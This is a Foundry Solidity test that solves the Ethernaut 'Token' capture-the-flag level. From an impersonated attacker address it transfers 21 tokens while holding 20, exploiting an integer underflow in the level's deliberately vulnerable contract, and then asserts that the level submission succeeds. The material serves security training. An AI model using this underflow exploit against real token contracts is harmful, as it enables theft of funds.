// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {TokenFactory} from "../src/levels/05-TokenFactory.sol";
import {Token} from "../src/levels/05-Token.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

contract TokenSolution is Test {
    Ethernaut internal ethernaut;
    address internal attacker = address(1337);
    TokenFactory internal factory;

    function solution(Token target) internal virtual {
        target.transfer(address(factory), 21);
    }

    function testSolution() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        factory = new TokenFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Token tokenContract = Token(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        solution(tokenContract);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
